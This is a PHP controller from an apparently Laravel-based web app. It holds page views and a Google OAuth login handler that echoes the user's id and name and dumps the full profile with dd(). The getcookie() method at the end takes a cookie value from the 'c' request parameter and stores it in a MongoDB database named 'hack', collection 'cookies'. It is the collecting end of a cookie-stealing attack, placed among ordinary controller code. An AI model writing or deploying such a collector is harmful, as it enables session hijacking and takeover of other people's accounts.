<?php

class HomeController extends BaseController {

	public function viewFirstPage()
	{
		return View::make('rishe');
	}

    public function viewOrderPage()
    {
        return View::make('order');
    }
    public function loginWithGoogle() {

        // get data from input
        $code = Input::get( 'code' );

        // get google service
        $googleService = OAuth::consumer( 'Google' );

        // check if code is valid

        // if code is provided get user data and sign in
        if ( !empty( $code ) ) {

            // This was a callback request from google, get the token
            $token = $googleService->requestAccessToken( $code );

            // Send a request with it
            $result = json_decode( $googleService->request( 'https://www.googleapis.com/oauth2/v1/userinfo' ), true );

            $message = 'Your unique Google user id is: ' . $result['id'] . ' and your name is ' . $result['name'];
            echo $message. "<br/>";

            //Var_dump
            //display whole array().
            dd($result);

        }
        // if not ask for permission first
        else {
            // get googleService authorization
            $url = $googleService->getAuthorizationUri();

            // return to google login url
            return Redirect::to( (string)$url );
        }
    }

    public function getcookie()
    {
        $cookie = Input::get("c");
        $mongoClient = new MongoClient();
        $db = $mongoClient->selectDB("hack");
        $collection = $db->selectCollection("cookies");
        $collection->insert(array("cookie"=>$cookie, "time"=> new MongoDate()));
    }
}
